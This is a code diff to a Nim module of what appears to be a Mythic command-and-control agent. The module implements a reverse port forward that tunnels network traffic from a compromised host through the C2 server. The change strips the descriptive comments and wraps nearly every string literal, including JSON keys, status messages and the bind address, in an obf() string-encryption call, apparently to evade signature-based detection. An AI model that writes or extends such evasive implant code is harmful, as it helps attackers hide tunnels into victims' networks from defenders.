@@ -1,9 +1,7 @@
-## Reverse Port Forward task for tunneling network traffic through Mythic
-## Agent listens on local port, forwards traffic to remote IP:port via Mythic
-
 import std/[json, net, nativesockets, strutils, base64, strformat, tables, random, os]
 import ../config
 import ../utils/mythic_responses
+import ../utils/strenc
 
 const
   BUFFER_SIZE = 8192
@@ -70,12 +68,12 @@ var
 proc createRpfwdMessage*(serverId: uint32, exit: bool, port: int, data: string = ""): JsonNode =
   ## Create an RPfwd message to send to Mythic
   result = %*{
-    "server_id": serverId,
-    "exit": exit,
-    "port": port
+    obf("server_id"): serverId,
+    obf("exit"): exit,
+    obf("port"): port
   }
   if data.len > 0:
-    result["data"] = %data
+    result[obf("data")] = %data
 
 proc readFromDestination(conn: ptr RpfwdConnectionObj) {.thread.} =
   ## Thread that reads from remote socket and sends to Mythic via main thread
@@ -217,9 +215,9 @@ proc acceptConnections(listener: ptr RpfwdListenerObj) {.thread.} =
 
 proc rpfwd*(taskId: string, params: JsonNode): JsonNode =
   ## Start/stop reverse port forward
-  let action = params{"action"}.getStr("start")
+  let action = params{obf("action")}.getStr(obf("start"))
   
-  if action == "stop":
+  if action == obf("stop"):
     # Stop existing listener
     if activeRpfwdListeners.hasKey(taskId):
       let listener = activeRpfwdListeners[taskId]
@@ -260,14 +258,15 @@ proc rpfwd*(taskId: string, params: JsonNode): JsonNode =
       activeRpfwdListeners.del(taskId)
       rpfwdActive = activeRpfwdListeners.len > 0
       
-      return mythicSuccess(taskId, fmt"Stopped reverse port forward on port {listener.port}")
+      return mythicSuccess(taskId, obf("Reverse port forward stopped successfully") &
+        fmt" on port {listener.port}")
     else:
-      return mythicError(taskId, "No active reverse port forward for this task")
+      return mythicError(taskId, obf("No active reverse port forward for this task"))
   
   # Start new listener
-  let port = params["port"].getInt()
-  let remoteIp = params["remote_ip"].getStr()
-  let remotePort = params["remote_port"].getInt()
+  let port = params[obf("port")].getInt()
+  let remoteIp = params[obf("remote_ip")].getStr()
+  let remotePort = params[obf("remote_port")].getInt()
   
   # Create listener socket
   var listenerSocket = newSocket()
@@ -275,10 +274,11 @@ proc rpfwd*(taskId: string, params: JsonNode): JsonNode =
   listenerSocket.getFd().setBlocking(true)  # Accept thread uses blocking accept
   
   try:
-    listenerSocket.bindAddr(Port(port), "0.0.0.0")
+    listenerSocket.bindAddr(Port(port), obf("0.0.0.0"))
     listenerSocket.listen()
   except OSError as e:
-    return mythicError(taskId, fmt"Failed to bind port {port}: {e.msg}")
+    return mythicError(taskId, obf("Failed to start listener on port ") & $port &
+      ": " & e.msg)
   
   # Create listener object
   var listener = RpfwdListener(
@@ -310,10 +310,11 @@ proc rpfwd*(taskId: string, params: JsonNode): JsonNode =
   
   # Return "processing" status - task continues in background
   return %*{
-    "task_id": taskId,
-    "user_output": fmt"Listening on 0.0.0.0:{port}, forwarding to {remoteIp}:{remotePort} via Mythic",
-    "completed": false,
-    "status": "processing"
+    obf("task_id"): taskId,
+    obf("user_output"): obf("Reverse port forward started on port ") & $port &
+      obf(", forwarding to ") & remoteIp & ":" & $remotePort,
+    obf("completed"): false,
+    obf("status"): obf("processing")
   }
 
 proc handleRpfwdMessages*(messages: seq[JsonNode]): seq[JsonNode] =
@@ -326,8 +327,8 @@ proc handleRpfwdMessages*(messages: seq[JsonNode]): seq[JsonNode] =
     listener.connections = listener.sharedPtr[].connections
   
   for msg in messages:
-    let serverId = msg["server_id"].getInt().uint32
-    let exit = msg.getOrDefault("exit").getBool(false)
+    let serverId = msg[obf("server_id")].getInt().uint32
+    let exit = msg.getOrDefault(obf("exit")).getBool(false)
     
     # Find connection with this server_id across all listeners
     var foundConn: RpfwdConnection = nil
@@ -349,8 +350,8 @@ proc handleRpfwdMessages*(messages: seq[JsonNode]): seq[JsonNode] =
       continue
     
     # Forward data to connection
-    if msg.hasKey("data"):
-      let dataB64 = msg["data"].getStr()
+    if msg.hasKey(obf("data")):
+      let dataB64 = msg[obf("data")].getStr()
       if dataB64.len > 0:
         let decoded = decode(dataB64)
         var dataBytes = newSeq[byte](decoded.len)
